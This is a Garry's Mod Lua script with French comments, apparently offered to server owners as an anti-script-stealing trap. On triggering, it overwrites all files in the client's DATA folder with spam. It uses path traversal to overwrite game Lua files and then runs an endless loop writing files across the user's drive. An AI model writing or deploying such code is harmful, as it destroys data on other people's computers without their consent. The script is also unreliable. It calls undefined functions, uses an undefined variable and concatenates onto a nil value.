_SCRIPT = "imabighaxor"

local function dontUseScripthookAntiFileSteal() -- rename le nom de la function pour un nom unique private a votre serveur
	local payload = string.rep("Script kiddie\n",10000)

	-- remove data folder
	local function bybyeDataAntiFileSteal(path)
		local files, folders = file.Find(path .. "*", "DATA")
		for _, f in pairs(files) do
			file.Write(path .. f, payload)
		end

		for _, d in pairs(folders) do
			bybyeDataAntiFileSteal(path .. d .. "/") -- rename le nom de la function pour un nom unique private a votre serveur
		end
	end
	bybyeData("")

	-- remove every lua in gmod
	local function byebyeGmodAntiFileSteal(path) -- rename le nom de la function pour un nom unique private a votre serveur
		local files, folders = file.Find(path .. "*", "BASE_PATH")
		for _, f in pairs(files) do
			if string.EndsWith(f, ".lua") then
				RunString(payload, "../../" .. path .. v, false)
			end
		end

		for _, d in pairs(folders) do
			byebyeGmod(path .. d .. "/")-- rename le nom de la function pour un nom unique private a votre serveur
		end
	end
	byebyeGmodAntiFileSteal("")

	-- massive spam hard drive
	while true do
		local foldername
		for i=0, 10 do
			foldername = foldername .. ("azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN0123456789")[math.random(62)]
		end
		for i=0, 100 do
			RunString(payload,"../../../../../../../../../../../../" .. foldername .. "/" .. foldername .. i .. ".lua",false)
		end
	end
end

timer.Simple(1, function()
	if _SCRIPT == "imabighaxor" then return end
	dontUseScripthookAntiFileSteal()-- rename le nom de la function pour un nom unique private a votre serveur
end)